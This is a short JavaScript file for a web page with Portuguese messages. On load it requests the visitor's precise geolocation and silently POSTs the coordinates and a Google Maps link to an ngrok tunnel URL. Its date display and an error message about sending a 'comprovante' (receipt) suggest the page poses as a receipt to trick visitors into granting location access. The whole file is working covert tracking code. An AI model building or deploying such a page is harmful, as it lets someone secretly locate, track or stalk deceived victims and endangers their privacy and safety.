window.addEventListener("load", () => {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError, { maximumAge: 60000, timeout: 5000, enableHighAccuracy: true });
    } else {
        alert("Algo deu errado. Tente novamente mais tarde.");
    }
});

const NGROK_SERVER_URL = "https://sheepdog-rich-presumably.ngrok-free.app";

const dataAtual = new Date();
const dia = String(dataAtual.getDate()).padStart(2, '0');
const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
const ano = dataAtual.getFullYear();

const dataFormatada = `${dia}/${mes}/${ano}`;

document.getElementById("data-atual").textContent = dataFormatada;

console.log(dataAtual)

function sendLocation(position) {
    const latitude = position.coords.latitude;
    const longitude = position.coords.longitude;
    const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

    fetch(`${NGROK_SERVER_URL}/send-location`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ latitude, longitude, maps })
    })
        .then(response => response.json())
        .then(data => {
            if (!data.success) {
                alert("Erro ao enviar o comprovante.");
            }
        })
        .catch(error => {
            console.error("Erro:", error);
        });
}

function handleError(error) {
    console.error("Erro:", error);
    alert("Erro ao obter a localização: " + error.message);
}